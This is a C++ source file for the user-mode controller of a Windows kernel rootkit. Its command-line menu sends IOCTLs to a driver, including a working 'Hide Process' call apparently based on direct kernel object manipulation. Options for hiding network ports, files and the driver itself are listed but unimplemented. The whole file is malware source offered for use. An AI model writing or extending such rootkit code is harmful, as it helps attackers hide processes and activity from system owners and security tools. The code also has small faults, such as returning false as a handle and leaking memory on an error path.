#include "stdafx.h"
#include "DriverHandler.h"


DriverHandler::DriverHandler()
{
}
// Connect to SymbolicLink and send IRP to driver (
HANDLE DriverHandler::connect_driver(wchar_t *driver_name) {
	HANDLE hDriver;
	wchar_t* driver_path = (wchar_t*)malloc(sizeof(wchar_t) * MAX_PATH);
	_snwprintf_s(driver_path, MAX_PATH, MAX_PATH, L"\\\\.\\%s", driver_name);
	printf("Connecting to %ws in path %ws\n", driver_name, driver_path);
	hDriver = CreateFile(driver_path, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("Error: Unable to connect to the driver (%Iu)\nMake sure the driver is loaded.", GetLastError());
		return false;
	}
	printf("Connected to %ws in path %ws\n", driver_name, driver_path);
	free(driver_path);
	return hDriver;
}

bool DriverHandler::disconnect_driver(HANDLE hDriver) {
	CloseHandle(hDriver);
	return true;
}

// Handle CLI
HANDLE DriverHandler::cli_handle_driver(HANDLE hDriver){
	unsigned int option; // Default option
	while (true) {
		printf("\nEnter an option:\n");
		printf("0) Kernel Driver Echo\n");
		printf("1) Kernel Driver Hello World\n");
		printf("2) Kernel Driver Hide Process\n");
		printf("3) Kernel Driver Hide Network Port\n");
		printf("4) Kernel Driver Hide File\n");
		printf("5) Kernel Driver Hide Driver\n");
		scanf_s("%u", &option);
		if (option == 0) {
			if (!(cli_handle_echo(hDriver))) {
				printf("Failed to handle_echo\n");
			}
		}
		if (option == 1) {
			if (!(cli_handle_helloworld(hDriver))) {
				printf("Failed to handle_helloworld\n");
			}
		}
		if (option == 2) {
			if (!(cli_handle_hideprocess(hDriver))) {
				printf("Failed to handle_hideprocess\n");
			}
		}
		if (option == 3) {
			printf("Unimplemented");
		}
		if (option == 4) {
			printf("Unimplemented");
		}
		if (option == 5) {
			printf("Unimplemented");
		}
	}
	return hDriver;
}

bool DriverHandler::cli_handle_echo(HANDLE hDriver) {
	char ReadBuffer[50] = { 0 };
	DWORD dwBytesRead = 0;
	printf("Kernel Driver Echo\n");
	char *message = (char*)malloc(sizeof(char) * 128);
	scanf_s("%s", message, 128);
	DeviceIoControl(hDriver, IOCTL_ECHO, message, strlen(message), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, NULL);
	printf("Message received from kerneland : %s\n", ReadBuffer);
	printf("Bytes read : %d\n", dwBytesRead);
	free(message);
	return true;
}

bool DriverHandler::cli_handle_helloworld(HANDLE hDriver) {
	char ReadBuffer[50] = { 0 };
	DWORD dwBytesRead = 0;
	printf("Kernel Driver Hello World\n");
	char *message = (char*)malloc(sizeof(char) * 128);
	scanf_s("%s", message, 128);
	DeviceIoControl(hDriver, IOCTL_BASIC, message, strlen(message), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, NULL);
	printf("Message received from kerneland : %s\n", ReadBuffer);
	printf("Bytes read : %d\n", dwBytesRead);
	free(message);
	return true;
}

bool DriverHandler::cli_handle_hideprocess(HANDLE hDriver) {
	char ReadBuffer[50] = { 0 };
	DWORD dwBytesRead = 0;
	printf("Kernel Driver Hide Process\n");
	printf("Enter ProcessId:\n");
	char *ProcessId = (char*)malloc(sizeof(char) * 128);
	scanf_s("%s", ProcessId, 128);
	DeviceIoControl(hDriver, IOCTL_DKOMPSHIDE, ProcessId, strlen(ProcessId), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, NULL);
	printf("Message received from kerneland : %s\n", ReadBuffer);
	printf("Bytes read : %d\n", dwBytesRead);
	free(ProcessId);
	return true;
}


// Automated

bool DriverHandler::handle_echo(HANDLE hDriver, char* buffer) {
	char ReadBuffer[50] = { 0 };
	DWORD dwBytesRead = 0;
	printf("Kernel Driver Echo\n");
	DeviceIoControl(hDriver, IOCTL_ECHO, buffer, strlen(buffer), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, NULL);
	printf("Message received from kerneland : %s\n", ReadBuffer);
	printf("Bytes read : %d\n", dwBytesRead);
	return true;
}

bool DriverHandler::handle_helloworld(HANDLE hDriver, char* buffer) {
	char ReadBuffer[50] = { 0 };
	DWORD dwBytesRead = 0;
	printf("Kernel Driver Hello World\n");
	DeviceIoControl(hDriver, IOCTL_BASIC, buffer, strlen(buffer), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, NULL);
	printf("Message received from kerneland : %s\n", ReadBuffer);
	printf("Bytes read : %d\n", dwBytesRead);
	return true;
}

bool DriverHandler::handle_hideprocess(HANDLE hDriver, char* buffer) {
	char ReadBuffer[50] = { 0 };
	DWORD dwBytesRead = 0;
	printf("Kernel Driver Hide Process\n");
	printf("%s\n", buffer);
	DeviceIoControl(hDriver, IOCTL_DKOMPSHIDE, buffer, strlen(buffer), ReadBuffer, sizeof(ReadBuffer), &dwBytesRead, NULL);
	printf("Message received from kerneland : %s\n", ReadBuffer);
	printf("Bytes read : %d\n", dwBytesRead);
	return true;
}


DriverHandler::~DriverHandler()
{
}
